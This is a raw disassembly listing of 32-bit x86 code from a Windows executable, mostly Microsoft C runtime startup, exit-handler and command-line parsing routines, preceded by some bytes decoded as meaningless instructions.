  424393:	push   edi
  424394:	mov    cl,0x3f
  424396:	jp     0x424362
  424398:	mov    ah,0x30
  42439a:	fsub   DWORD PTR [edi+0x64]
  42439d:	jns    0x4243df
  42439f:	arpl   WORD PTR [eax],si
  4243a1:	push   cs
  4243a2:	scas   eax,DWORD PTR es:[edi]
  4243a3:	xchg   edx,eax
  4243a4:	cmp    cl,ch
  4243a6:	inc    edi
  4243a7:	add    edx,DWORD PTR [eax+0x61]
  4243aa:	xor    al,0x7a
  4243ac:	cmp    DWORD PTR [edx+edx*1-0x2b],ebx
  4243b0:	jmp    0x4243c4
  4243b2:	int    0x89
  4243b4:	sar    BYTE PTR [ebx+0x6d],cl
  4243b7:	push   ss
  4243b8:	fst    QWORD PTR [ebp+0x72b0bdc3]
  4243be:	inc    eax
  4243bf:	push   ds
  4243c0:	dec    ebx
  4243c1:	mov    DWORD PTR [ecx+edi*4-0x40ee9e03],esp
  4243c8:	lods   eax,DWORD PTR ds:[esi]
  4243c9:	(bad)  
  4243cb:	mov    ecx,DWORD PTR [ecx]
  4243cd:	and    al,0x5d
  4243cf:	push   eax
  4243d0:	mov    eax,ds:0x665f5bdf
  4243d5:	jb     0x424378
  4243d7:	xchg   esi,eax
  4243d8:	outs   dx,BYTE PTR ds:[esi]
  4243d9:	daa    
  4243da:	xchg   ebp,eax
  4243db:	add    BYTE PTR [esi+0x24],al
  4243de:	ss jmp 0x424402
  4243e1:	mov    ebp,0xa7d5c0df
  4243e6:	mov    ebp,0xdf311e7f
  4243eb:	addr16 xor ah,dl
  4243ee:	push   0x0
  4243f0:	push   0x0
  4243f2:	call   0x424400
  4243f7:	xor    eax,eax
  4243f9:	add    esp,0x10
  4243fc:	ret    0x10
  4243ff:	nop
  424400:	jmp    DWORD PTR ds:0x429110
  424406:	cmp    DWORD PTR ds:0x45dabc,0x1
  42440d:	jne    0x424414
  42440f:	call   0x424952
  424414:	push   DWORD PTR [esp+0x4]
  424418:	call   0x4247db
  42441d:	push   0xff
  424422:	call   DWORD PTR ds:0x45d1c0
  424428:	pop    ecx
  424429:	pop    ecx
  42442a:	ret    
  42442b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424432:	jne    0x424439
  424434:	call   0x424952
  424439:	push   DWORD PTR [esp+0x4]
  42443d:	call   0x4247db
  424442:	push   0xff
  424447:	call   0x424621
  42444c:	pop    ecx
  42444d:	pop    ecx
  42444e:	ret    
  42444f:	push   0x60
  424451:	push   0x429220
  424456:	call   0x425340
  42445b:	mov    edi,0x94
  424460:	mov    eax,edi
  424462:	call   0x425390
  424467:	mov    DWORD PTR [ebp-0x18],esp
  42446a:	mov    esi,esp
  42446c:	mov    DWORD PTR [esi],edi
  42446e:	push   esi
  42446f:	call   DWORD PTR ds:0x429054
  424475:	mov    ecx,DWORD PTR [esi+0x10]
  424478:	mov    DWORD PTR ds:0x45dac4,ecx
  42447e:	mov    eax,DWORD PTR [esi+0x4]
  424481:	mov    ds:0x45dad0,eax
  424486:	mov    edx,DWORD PTR [esi+0x8]
  424489:	mov    DWORD PTR ds:0x45dad4,edx
  42448f:	mov    esi,DWORD PTR [esi+0xc]
  424492:	and    esi,0x7fff
  424498:	mov    DWORD PTR ds:0x45dac8,esi
  42449e:	cmp    ecx,0x2
  4244a1:	je     0x4244af
  4244a3:	or     esi,0x8000
  4244a9:	mov    DWORD PTR ds:0x45dac8,esi
  4244af:	shl    eax,0x8
  4244b2:	add    eax,edx
  4244b4:	mov    ds:0x45dacc,eax
  4244b9:	xor    esi,esi
  4244bb:	push   esi
  4244bc:	mov    edi,DWORD PTR ds:0x429024
  4244c2:	call   edi
  4244c4:	cmp    WORD PTR [eax],0x5a4d
  4244c9:	jne    0x4244ea
  4244cb:	mov    ecx,DWORD PTR [eax+0x3c]
  4244ce:	add    ecx,eax
  4244d0:	cmp    DWORD PTR [ecx],0x4550
  4244d6:	jne    0x4244ea
  4244d8:	movzx  eax,WORD PTR [ecx+0x18]
  4244dc:	cmp    eax,0x10b
  4244e1:	je     0x424502
  4244e3:	cmp    eax,0x20b
  4244e8:	je     0x4244ef
  4244ea:	mov    DWORD PTR [ebp-0x1c],esi
  4244ed:	jmp    0x424516
  4244ef:	cmp    DWORD PTR [ecx+0x84],0xe
  4244f6:	jbe    0x4244ea
  4244f8:	xor    eax,eax
  4244fa:	cmp    DWORD PTR [ecx+0xf8],esi
  424500:	jmp    0x424510
  424502:	cmp    DWORD PTR [ecx+0x74],0xe
  424506:	jbe    0x4244ea
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xe8],esi
  424510:	setne  al
  424513:	mov    DWORD PTR [ebp-0x1c],eax
  424516:	push   0x1
  424518:	call   0x4252ed
  42451d:	pop    ecx
  42451e:	test   eax,eax
  424520:	jne    0x42452a
  424522:	push   0x1c
  424524:	call   0x42442b
  424529:	pop    ecx
  42452a:	call   0x425264
  42452f:	test   eax,eax
  424531:	jne    0x42453b
  424533:	push   0x10
  424535:	call   0x42442b
  42453a:	pop    ecx
  42453b:	call   0x42514d
  424540:	mov    DWORD PTR [ebp-0x4],esi
  424543:	call   0x424f4f
  424548:	test   eax,eax
  42454a:	jge    0x424554
  42454c:	push   0x1b
  42454e:	call   0x424406
  424553:	pop    ecx
  424554:	call   DWORD PTR ds:0x429050
  42455a:	mov    ds:0x45e274,eax
  42455f:	call   0x424e2d
  424564:	mov    ds:0x45dab4,eax
  424569:	call   0x424d8b
  42456e:	test   eax,eax
  424570:	jge    0x42457a
  424572:	push   0x8
  424574:	call   0x424406
  424579:	pop    ecx
  42457a:	call   0x424b58
  42457f:	test   eax,eax
  424581:	jge    0x42458b
  424583:	push   0x9
  424585:	call   0x424406
  42458a:	pop    ecx
  42458b:	call   0x424663
  424590:	mov    DWORD PTR [ebp-0x20],eax
  424593:	cmp    eax,esi
  424595:	je     0x42459e
  424597:	push   eax
  424598:	call   0x424406
  42459d:	pop    ecx
  42459e:	mov    DWORD PTR [ebp-0x38],esi
  4245a1:	lea    eax,[ebp-0x64]
  4245a4:	push   eax
  4245a5:	call   DWORD PTR ds:0x42904c
  4245ab:	call   0x424aef
  4245b0:	mov    DWORD PTR [ebp-0x68],eax
  4245b3:	test   BYTE PTR [ebp-0x38],0x1
  4245b7:	je     0x4245bf
  4245b9:	movzx  eax,WORD PTR [ebp-0x34]
  4245bd:	jmp    0x4245c2
  4245bf:	push   0xa
  4245c1:	pop    eax
  4245c2:	push   eax
  4245c3:	push   DWORD PTR [ebp-0x68]
  4245c6:	push   esi
  4245c7:	push   esi
  4245c8:	call   edi
  4245ca:	push   eax
  4245cb:	call   0x422f80
  4245d0:	mov    edi,eax
  4245d2:	mov    DWORD PTR [ebp-0x6c],edi
  4245d5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245d8:	jne    0x4245e0
  4245da:	push   edi
  4245db:	call   0x42479b
  4245e0:	call   0x4247bd
  4245e5:	jmp    0x424612
  4245e7:	mov    eax,DWORD PTR [ebp-0x14]
  4245ea:	mov    ecx,DWORD PTR [eax]
  4245ec:	mov    ecx,DWORD PTR [ecx]
  4245ee:	mov    DWORD PTR [ebp-0x70],ecx
  4245f1:	push   eax
  4245f2:	push   ecx
  4245f3:	call   0x42498b
  4245f8:	pop    ecx
  4245f9:	pop    ecx
  4245fa:	ret    
  4245fb:	mov    esp,DWORD PTR [ebp-0x18]
  4245fe:	mov    edi,DWORD PTR [ebp-0x70]
  424601:	cmp    DWORD PTR [ebp-0x1c],0x0
  424605:	jne    0x42460d
  424607:	push   edi
  424608:	call   0x4247ac
  42460d:	call   0x4247cc
  424612:	or     DWORD PTR [ebp-0x4],0xffffffff
  424616:	mov    eax,edi
  424618:	lea    esp,[ebp-0x7c]
  42461b:	call   0x42537b
  424620:	ret    
  424621:	push   0x42923c
  424626:	call   DWORD PTR ds:0x429024
  42462c:	test   eax,eax
  42462e:	je     0x424646
  424630:	push   0x42922c
  424635:	push   eax
  424636:	call   DWORD PTR ds:0x429020
  42463c:	test   eax,eax
  42463e:	je     0x424646
  424640:	push   DWORD PTR [esp+0x4]
  424644:	call   eax
  424646:	push   DWORD PTR [esp+0x4]
  42464a:	call   DWORD PTR ds:0x429058
  424650:	int3   
  424651:	push   0x8
  424653:	call   0x4254ff
  424658:	pop    ecx
  424659:	ret    
  42465a:	push   0x8
  42465c:	call   0x42546b
  424661:	pop    ecx
  424662:	ret    
  424663:	mov    eax,ds:0x45e270
  424668:	test   eax,eax
  42466a:	je     0x42466e
  42466c:	call   eax
  42466e:	push   esi
  42466f:	push   edi
  424670:	mov    ecx,0x42b00c
  424675:	mov    edi,0x42b018
  42467a:	xor    eax,eax
  42467c:	cmp    ecx,edi
  42467e:	mov    esi,ecx
  424680:	jae    0x424699
  424682:	test   eax,eax
  424684:	jne    0x4246c5
  424686:	mov    ecx,DWORD PTR [esi]
  424688:	test   ecx,ecx
  42468a:	je     0x42468e
  42468c:	call   ecx
  42468e:	add    esi,0x4
  424691:	cmp    esi,edi
  424693:	jb     0x424682
  424695:	test   eax,eax
  424697:	jne    0x4246c5
  424699:	push   0x425191
  42469e:	call   0x425610
  4246a3:	mov    esi,0x42b000
  4246a8:	mov    eax,esi
  4246aa:	mov    edi,0x42b008
  4246af:	cmp    eax,edi
  4246b1:	pop    ecx
  4246b2:	jae    0x4246c3
  4246b4:	mov    eax,DWORD PTR [esi]
  4246b6:	test   eax,eax
  4246b8:	je     0x4246bc
  4246ba:	call   eax
  4246bc:	add    esi,0x4
  4246bf:	cmp    esi,edi
  4246c1:	jb     0x4246b4
  4246c3:	xor    eax,eax
  4246c5:	pop    edi
  4246c6:	pop    esi
  4246c7:	ret    
  4246c8:	push   ebp
  4246c9:	mov    ebp,esp
  4246cb:	push   esi
  4246cc:	push   edi
  4246cd:	push   0x8
  4246cf:	call   0x4254ff
  4246d4:	xor    esi,esi
  4246d6:	inc    esi
  4246d7:	cmp    DWORD PTR ds:0x45db04,esi
  4246dd:	pop    ecx
  4246de:	jne    0x4246f0
  4246e0:	push   DWORD PTR [ebp+0x8]
  4246e3:	call   DWORD PTR ds:0x429060
  4246e9:	push   eax
  4246ea:	call   DWORD PTR ds:0x42905c
  4246f0:	cmp    DWORD PTR [ebp+0xc],0x0
  4246f4:	mov    al,BYTE PTR [ebp+0x10]
  4246f7:	mov    DWORD PTR ds:0x45db00,esi
  4246fd:	mov    ds:0x45dafc,al
  424702:	jne    0x424756
  424704:	mov    ecx,DWORD PTR ds:0x45e268
  42470a:	test   ecx,ecx
  42470c:	je     0x424737
  42470e:	mov    eax,ds:0x45e264
  424713:	sub    eax,0x4
  424716:	cmp    eax,ecx
  424718:	jmp    0x424730
  42471a:	mov    eax,DWORD PTR [eax]
  42471c:	test   eax,eax
  42471e:	je     0x424722
  424720:	call   eax
  424722:	mov    eax,ds:0x45e264
  424727:	sub    eax,0x4
  42472a:	cmp    eax,DWORD PTR ds:0x45e268
  424730:	mov    ds:0x45e264,eax
  424735:	jae    0x42471a
  424737:	mov    eax,0x42b01c
  42473c:	mov    esi,0x42b020
  424741:	cmp    eax,esi
  424743:	mov    edi,eax
  424745:	jae    0x424756
  424747:	mov    eax,DWORD PTR [edi]
  424749:	test   eax,eax
  42474b:	je     0x42474f
  42474d:	call   eax
  42474f:	add    edi,0x4
  424752:	cmp    edi,esi
  424754:	jb     0x424747
  424756:	mov    eax,0x42b024
  42475b:	mov    esi,0x42b028
  424760:	cmp    eax,esi
  424762:	mov    edi,eax
  424764:	jae    0x424775
  424766:	mov    eax,DWORD PTR [edi]
  424768:	test   eax,eax
  42476a:	je     0x42476e
  42476c:	call   eax
  42476e:	add    edi,0x4
  424771:	cmp    edi,esi
  424773:	jb     0x424766
  424775:	cmp    DWORD PTR [ebp+0x10],0x0
  424779:	pop    edi
  42477a:	pop    esi
  42477b:	je     0x424786
  42477d:	push   0x8
  42477f:	call   0x42546b
  424784:	jmp    0x424798
  424786:	push   DWORD PTR [ebp+0x8]
  424789:	mov    DWORD PTR ds:0x45db04,0x1
  424793:	call   0x424621
  424798:	pop    ecx
  424799:	pop    ebp
  42479a:	ret    
  42479b:	push   0x0
  42479d:	push   0x0
  42479f:	push   DWORD PTR [esp+0xc]
  4247a3:	call   0x4246c8
  4247a8:	add    esp,0xc
  4247ab:	ret    
  4247ac:	push   0x0
  4247ae:	push   0x1
  4247b0:	push   DWORD PTR [esp+0xc]
  4247b4:	call   0x4246c8
  4247b9:	add    esp,0xc
  4247bc:	ret    
  4247bd:	push   0x1
  4247bf:	push   0x0
  4247c1:	push   0x0
  4247c3:	call   0x4246c8
  4247c8:	add    esp,0xc
  4247cb:	ret    
  4247cc:	push   0x1
  4247ce:	push   0x1
  4247d0:	push   0x0
  4247d2:	call   0x4246c8
  4247d7:	add    esp,0xc
  4247da:	ret    
  4247db:	push   ebp
  4247dc:	mov    ebp,esp
  4247de:	sub    esp,0x10c
  4247e4:	mov    eax,ds:0x45d430
  4247e9:	xor    eax,DWORD PTR [ebp+0x4]
  4247ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ef:	push   ebx
  4247f0:	push   esi
  4247f1:	mov    DWORD PTR [ebp-0x4],eax
  4247f4:	xor    edx,edx
  4247f6:	push   edi
  4247f7:	xor    eax,eax
  4247f9:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424800:	je     0x424808
  424802:	inc    eax
  424803:	cmp    eax,0x12
  424806:	jb     0x4247f9
  424808:	mov    esi,eax
  42480a:	shl    esi,0x3
  42480d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424813:	jne    0x42493c
  424819:	mov    eax,ds:0x45dabc
  42481e:	cmp    eax,0x1
  424821:	je     0x424917
  424827:	cmp    eax,edx
  424829:	jne    0x424838
  42482b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424832:	je     0x424917
  424838:	cmp    ecx,0xfc
  42483e:	je     0x42493c
  424844:	push   0x104
  424849:	lea    eax,[ebp-0x10c]
  42484f:	push   eax
  424850:	push   edx
  424851:	mov    BYTE PTR [ebp-0x8],dl
  424854:	call   DWORD PTR ds:0x429068
  42485a:	test   eax,eax
  42485c:	jne    0x424871
  42485e:	lea    eax,[ebp-0x10c]
  424864:	push   0x429594
  424869:	push   eax
  42486a:	call   0x425720
  42486f:	pop    ecx
  424870:	pop    ecx
  424871:	lea    eax,[ebp-0x10c]
  424877:	push   eax
  424878:	lea    edi,[ebp-0x10c]
  42487e:	call   0x425950
  424883:	inc    eax
  424884:	cmp    eax,0x3c
  424887:	pop    ecx
  424888:	jbe    0x4248b3
  42488a:	lea    eax,[ebp-0x10c]
  424890:	push   eax
  424891:	call   0x425950
  424896:	mov    edi,eax
  424898:	lea    eax,[ebp-0x10c]
  42489e:	sub    eax,0x3b
  4248a1:	push   0x3
  4248a3:	add    edi,eax
  4248a5:	push   0x429590
  4248aa:	push   edi
  4248ab:	call   0x425820
  4248b0:	add    esp,0x10
  4248b3:	push   edi
  4248b4:	call   0x425950
  4248b9:	push   DWORD PTR [esi+0x45d1cc]
  4248bf:	mov    ebx,eax
  4248c1:	call   0x425950
  4248c6:	lea    eax,[ebx+eax*1+0x1c]
  4248ca:	pop    ecx
  4248cb:	add    eax,0x3
  4248ce:	pop    ecx
  4248cf:	and    eax,0xfffffffc
  4248d2:	call   0x425390
  4248d7:	mov    ebx,esp
  4248d9:	push   0x429574
  4248de:	push   ebx
  4248df:	call   0x425720
  4248e4:	push   edi
  4248e5:	push   ebx
  4248e6:	call   0x425730
  4248eb:	push   0x429570
  4248f0:	push   ebx
  4248f1:	call   0x425730
  4248f6:	push   DWORD PTR [esi+0x45d1cc]
  4248fc:	push   ebx
  4248fd:	call   0x425730
  424902:	push   0x12010
  424907:	push   0x429548
  42490c:	push   ebx
  42490d:	call   0x425622
  424912:	add    esp,0x2c
  424915:	jmp    0x42493c
  424917:	push   edx
  424918:	lea    eax,[ebp+0x8]
  42491b:	push   eax
  42491c:	lea    esi,[esi+0x45d1cc]
  424922:	push   DWORD PTR [esi]
  424924:	call   0x425950
  424929:	pop    ecx
  42492a:	push   eax
  42492b:	push   DWORD PTR [esi]
  42492d:	push   0xfffffff4
  42492f:	call   DWORD PTR ds:0x429064
  424935:	push   eax
  424936:	call   DWORD PTR ds:0x42900c
  42493c:	lea    esp,[ebp-0x118]
  424942:	mov    ecx,DWORD PTR [ebp-0x4]
  424945:	xor    ecx,DWORD PTR [ebp+0x4]
  424948:	call   0x425a0c
  42494d:	pop    edi
  42494e:	pop    esi
  42494f:	pop    ebx
  424950:	leave  
  424951:	ret    
  424952:	mov    eax,ds:0x45dabc
  424957:	cmp    eax,0x1
  42495a:	je     0x424969
  42495c:	test   eax,eax
  42495e:	jne    0x42498a
  424960:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424967:	jne    0x42498a
  424969:	push   0xfc
  42496e:	call   0x4247db
  424973:	mov    eax,ds:0x45db08
  424978:	test   eax,eax
  42497a:	pop    ecx
  42497b:	je     0x42497f
  42497d:	call   eax
  42497f:	push   0xff
  424984:	call   0x4247db
  424989:	pop    ecx
  42498a:	ret    
  42498b:	push   ebp
  42498c:	mov    ebp,esp
  42498e:	push   ecx
  42498f:	push   ebx
  424990:	push   esi
  424991:	push   edi
  424992:	call   0x4251f3
  424997:	mov    edi,DWORD PTR [ebp+0x8]
  42499a:	mov    esi,eax
  42499c:	mov    edx,DWORD PTR [esi+0x54]
  42499f:	mov    eax,ds:0x45d2dc
  4249a4:	mov    ecx,edx
  4249a6:	cmp    DWORD PTR [ecx],edi
  4249a8:	je     0x4249b7
  4249aa:	lea    ebx,[eax+eax*2]
  4249ad:	add    ecx,0xc
  4249b0:	lea    ebx,[edx+ebx*4]
  4249b3:	cmp    ecx,ebx
  4249b5:	jb     0x4249a6
  4249b7:	lea    eax,[eax+eax*2]
  4249ba:	lea    eax,[edx+eax*4]
  4249bd:	cmp    ecx,eax
  4249bf:	jae    0x4249c5
  4249c1:	cmp    DWORD PTR [ecx],edi
  4249c3:	je     0x4249c7
  4249c5:	xor    ecx,ecx
  4249c7:	test   ecx,ecx
  4249c9:	je     0x424ae1
  4249cf:	mov    ebx,DWORD PTR [ecx+0x8]
  4249d2:	test   ebx,ebx
  4249d4:	mov    DWORD PTR [ebp+0x8],ebx
  4249d7:	je     0x424ae1
  4249dd:	cmp    ebx,0x5
  4249e0:	jne    0x4249ee
  4249e2:	and    DWORD PTR [ecx+0x8],0x0
  4249e6:	xor    eax,eax
  4249e8:	inc    eax
  4249e9:	jmp    0x424aea
  4249ee:	cmp    ebx,0x1
  4249f1:	je     0x424adc
  4249f7:	mov    eax,DWORD PTR [esi+0x58]
  4249fa:	mov    DWORD PTR [ebp-0x4],eax
  4249fd:	mov    eax,DWORD PTR [ebp+0xc]
  424a00:	mov    DWORD PTR [esi+0x58],eax
  424a03:	mov    eax,DWORD PTR [ecx+0x4]
  424a06:	cmp    eax,0x8
  424a09:	jne    0x424ace
  424a0f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a15:	mov    eax,ds:0x45d2d4
  424a1a:	add    eax,edx
  424a1c:	cmp    edx,eax
  424a1e:	jge    0x424a47
  424a20:	lea    eax,[edx+edx*2]
  424a23:	shl    eax,0x2
  424a26:	mov    edi,DWORD PTR [esi+0x54]
  424a29:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a2e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a34:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a3a:	inc    edx
  424a3b:	add    ebx,edi
  424a3d:	add    eax,0xc
  424a40:	cmp    edx,ebx
  424a42:	jl     0x424a26
  424a44:	mov    ebx,DWORD PTR [ebp+0x8]
  424a47:	mov    ecx,DWORD PTR [ecx]
  424a49:	cmp    ecx,0xc000008e
  424a4f:	mov    edi,DWORD PTR [esi+0x5c]
  424a52:	jne    0x424a5d
  424a54:	mov    DWORD PTR [esi+0x5c],0x83
  424a5b:	jmp    0x424ac1
  424a5d:	cmp    ecx,0xc0000090
  424a63:	jne    0x424a6e
  424a65:	mov    DWORD PTR [esi+0x5c],0x81
  424a6c:	jmp    0x424ac1
  424a6e:	cmp    ecx,0xc0000091
  424a74:	jne    0x424a7f
  424a76:	mov    DWORD PTR [esi+0x5c],0x84
  424a7d:	jmp    0x424ac1
  424a7f:	cmp    ecx,0xc0000093
  424a85:	jne    0x424a90
  424a87:	mov    DWORD PTR [esi+0x5c],0x85
  424a8e:	jmp    0x424ac1
  424a90:	cmp    ecx,0xc000008d
  424a96:	jne    0x424aa1
  424a98:	mov    DWORD PTR [esi+0x5c],0x82
  424a9f:	jmp    0x424ac1
  424aa1:	cmp    ecx,0xc000008f
  424aa7:	jne    0x424ab2
  424aa9:	mov    DWORD PTR [esi+0x5c],0x86
  424ab0:	jmp    0x424ac1
  424ab2:	cmp    ecx,0xc0000092
  424ab8:	jne    0x424ac1
  424aba:	mov    DWORD PTR [esi+0x5c],0x8a
  424ac1:	push   DWORD PTR [esi+0x5c]
  424ac4:	push   0x8
  424ac6:	call   ebx
  424ac8:	pop    ecx
  424ac9:	mov    DWORD PTR [esi+0x5c],edi
  424acc:	jmp    0x424ad5
  424ace:	and    DWORD PTR [ecx+0x8],0x0
  424ad2:	push   eax
  424ad3:	call   ebx
  424ad5:	mov    eax,DWORD PTR [ebp-0x4]
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x58],eax
  424adc:	or     eax,0xffffffff
  424adf:	jmp    0x424aea
  424ae1:	push   DWORD PTR [ebp+0xc]
  424ae4:	call   DWORD PTR ds:0x42906c
  424aea:	pop    edi
  424aeb:	pop    esi
  424aec:	pop    ebx
  424aed:	leave  
  424aee:	ret    
  424aef:	cmp    DWORD PTR ds:0x45e26c,0x0
  424af6:	jne    0x424afd
  424af8:	call   0x425f2c
  424afd:	push   esi
  424afe:	mov    esi,DWORD PTR ds:0x45e274
  424b04:	test   esi,esi
  424b06:	jne    0x424b0f
  424b08:	mov    esi,0x4295ab
  424b0d:	jmp    0x424b54
  424b0f:	mov    al,BYTE PTR [esi]
  424b11:	cmp    al,0x22
  424b13:	jne    0x424b3d
  424b15:	inc    esi
  424b16:	mov    al,BYTE PTR [esi]
  424b18:	cmp    al,0x22
  424b1a:	je     0x424b4d
  424b1c:	test   al,al
  424b1e:	je     0x424b36
  424b20:	movzx  eax,al
  424b23:	push   eax
  424b24:	call   0x425a4b
  424b29:	test   eax,eax
  424b2b:	pop    ecx
  424b2c:	je     0x424b2f
  424b2e:	inc    esi
  424b2f:	inc    esi
  424b30:	mov    al,BYTE PTR [esi]
  424b32:	cmp    al,0x22
  424b34:	jne    0x424b1c
  424b36:	cmp    BYTE PTR [esi],0x22
  424b39:	jne    0x424b4e
  424b3b:	jmp    0x424b4d
  424b3d:	cmp    al,0x20
  424b3f:	jbe    0x424b4e
  424b41:	inc    esi
  424b42:	cmp    BYTE PTR [esi],0x20
  424b45:	ja     0x424b41
  424b47:	jmp    0x424b4e
  424b49:	cmp    al,0x20
  424b4b:	ja     0x424b54
  424b4d:	inc    esi
  424b4e:	mov    al,BYTE PTR [esi]
  424b50:	test   al,al
  424b52:	jne    0x424b49
  424b54:	mov    eax,esi
  424b56:	pop    esi
  424b57:	ret    
  424b58:	push   ebx
  424b59:	xor    ebx,ebx
  424b5b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b61:	push   esi
  424b62:	push   edi
  424b63:	jne    0x424b6a
  424b65:	call   0x425f2c
  424b6a:	mov    esi,DWORD PTR ds:0x45dab4
  424b70:	xor    edi,edi
  424b72:	cmp    esi,ebx
  424b74:	jne    0x424b88
  424b76:	jmp    0x424ba8
  424b78:	cmp    al,0x3d
  424b7a:	je     0x424b7d
  424b7c:	inc    edi
  424b7d:	push   esi
  424b7e:	call   0x425950
  424b83:	pop    ecx
  424b84:	lea    esi,[esi+eax*1+0x1]
  424b88:	mov    al,BYTE PTR [esi]
  424b8a:	cmp    al,bl
  424b8c:	jne    0x424b78
  424b8e:	lea    eax,[edi*4+0x4]
  424b95:	push   eax
  424b96:	call   0x426062
  424b9b:	mov    edi,eax
  424b9d:	cmp    edi,ebx
  424b9f:	pop    ecx
  424ba0:	mov    DWORD PTR ds:0x45dae4,edi
  424ba6:	jne    0x424bad
  424ba8:	or     eax,0xffffffff
  424bab:	jmp    0x424c05
  424bad:	mov    esi,DWORD PTR ds:0x45dab4
  424bb3:	push   ebp
  424bb4:	jmp    0x424be0
  424bb6:	push   esi
  424bb7:	call   0x425950
  424bbc:	mov    ebp,eax
  424bbe:	inc    ebp
  424bbf:	cmp    BYTE PTR [esi],0x3d
  424bc2:	pop    ecx
  424bc3:	je     0x424bde
  424bc5:	push   ebp
  424bc6:	call   0x426062
  424bcb:	cmp    eax,ebx
  424bcd:	pop    ecx
  424bce:	mov    DWORD PTR [edi],eax
  424bd0:	je     0x424c09
  424bd2:	push   esi
  424bd3:	push   eax
  424bd4:	call   0x425720
  424bd9:	pop    ecx
  424bda:	pop    ecx
  424bdb:	add    edi,0x4
  424bde:	add    esi,ebp
  424be0:	cmp    BYTE PTR [esi],bl
  424be2:	jne    0x424bb6
  424be4:	push   DWORD PTR ds:0x45dab4
  424bea:	call   0x425f4a
  424bef:	mov    DWORD PTR ds:0x45dab4,ebx
  424bf5:	mov    DWORD PTR [edi],ebx
  424bf7:	mov    DWORD PTR ds:0x45e260,0x1
  424c01:	xor    eax,eax
  424c03:	pop    ecx
  424c04:	pop    ebp
  424c05:	pop    edi
  424c06:	pop    esi
  424c07:	pop    ebx
  424c08:	ret    
  424c09:	push   DWORD PTR ds:0x45dae4
  424c0f:	call   0x425f4a
  424c14:	mov    DWORD PTR ds:0x45dae4,ebx
  424c1a:	or     eax,0xffffffff
  424c1d:	jmp    0x424c03
  424c1f:	push   ebp
  424c20:	mov    ebp,esp
  424c22:	push   ecx
  424c23:	push   ebx
  424c24:	mov    ebx,DWORD PTR [ebp+0xc]
  424c27:	xor    edx,edx
  424c29:	cmp    DWORD PTR [ebp+0x8],edx
  424c2c:	push   edi
  424c2d:	mov    DWORD PTR [esi],edx
  424c2f:	mov    edi,ecx
  424c31:	mov    DWORD PTR [ebx],0x1
  424c37:	je     0x424c42
  424c39:	mov    ecx,DWORD PTR [ebp+0x8]
  424c3c:	add    DWORD PTR [ebp+0x8],0x4
  424c40:	mov    DWORD PTR [ecx],edi
  424c42:	cmp    BYTE PTR [eax],0x22
  424c45:	jne    0x424c55
  424c47:	xor    ecx,ecx
  424c49:	test   edx,edx
  424c4b:	sete   cl
  424c4e:	inc    eax
  424c4f:	mov    edx,ecx
  424c51:	mov    cl,0x22
  424c53:	jmp    0x424c82
  424c55:	inc    DWORD PTR [esi]
  424c57:	test   edi,edi
  424c59:	je     0x424c60
  424c5b:	mov    cl,BYTE PTR [eax]
  424c5d:	mov    BYTE PTR [edi],cl
  424c5f:	inc    edi
  424c60:	mov    cl,BYTE PTR [eax]
  424c62:	movzx  ebx,cl
  424c65:	inc    eax
  424c66:	test   BYTE PTR [ebx+0x45df21],0x4
  424c6d:	je     0x424c7b
  424c6f:	inc    DWORD PTR [esi]
  424c71:	test   edi,edi
  424c73:	je     0x424c7a
  424c75:	mov    bl,BYTE PTR [eax]
  424c77:	mov    BYTE PTR [edi],bl
  424c79:	inc    edi
  424c7a:	inc    eax
  424c7b:	test   cl,cl
  424c7d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c80:	je     0x424cb4
  424c82:	test   edx,edx
  424c84:	jne    0x424c42
  424c86:	cmp    cl,0x20
  424c89:	je     0x424c90
  424c8b:	cmp    cl,0x9
  424c8e:	jne    0x424c42
  424c90:	test   edi,edi
  424c92:	je     0x424c98
  424c94:	and    BYTE PTR [edi-0x1],0x0
  424c98:	and    DWORD PTR [ebp-0x4],0x0
  424c9c:	cmp    BYTE PTR [eax],0x0
  424c9f:	je     0x424d7b
  424ca5:	mov    cl,BYTE PTR [eax]
  424ca7:	cmp    cl,0x20
  424caa:	je     0x424cb1
  424cac:	cmp    cl,0x9
  424caf:	jne    0x424cb7
  424cb1:	inc    eax
  424cb2:	jmp    0x424ca5
  424cb4:	dec    eax
  424cb5:	jmp    0x424c98
  424cb7:	cmp    BYTE PTR [eax],0x0
  424cba:	je     0x424d7b
  424cc0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cc4:	je     0x424ccf
  424cc6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc9:	add    DWORD PTR [ebp+0x8],0x4
  424ccd:	mov    DWORD PTR [ecx],edi
  424ccf:	inc    DWORD PTR [ebx]
  424cd1:	xor    ebx,ebx
  424cd3:	inc    ebx
  424cd4:	xor    edx,edx
  424cd6:	jmp    0x424cda
  424cd8:	inc    eax
  424cd9:	inc    edx
  424cda:	cmp    BYTE PTR [eax],0x5c
  424cdd:	je     0x424cd8
  424cdf:	cmp    BYTE PTR [eax],0x22
  424ce2:	jne    0x424d0a
  424ce4:	test   dl,0x1
  424ce7:	jne    0x424d08
  424ce9:	cmp    DWORD PTR [ebp-0x4],0x0
  424ced:	je     0x424cfb
  424cef:	lea    ecx,[eax+0x1]
  424cf2:	cmp    BYTE PTR [ecx],0x22
  424cf5:	jne    0x424cfb
  424cf7:	mov    eax,ecx
  424cf9:	jmp    0x424cfd
  424cfb:	xor    ebx,ebx
  424cfd:	xor    ecx,ecx
  424cff:	cmp    DWORD PTR [ebp-0x4],ecx
  424d02:	sete   cl
  424d05:	mov    DWORD PTR [ebp-0x4],ecx
  424d08:	shr    edx,1
  424d0a:	test   edx,edx
  424d0c:	je     0x424d1b
  424d0e:	test   edi,edi
  424d10:	je     0x424d16
  424d12:	mov    BYTE PTR [edi],0x5c
  424d15:	inc    edi
  424d16:	inc    DWORD PTR [esi]
  424d18:	dec    edx
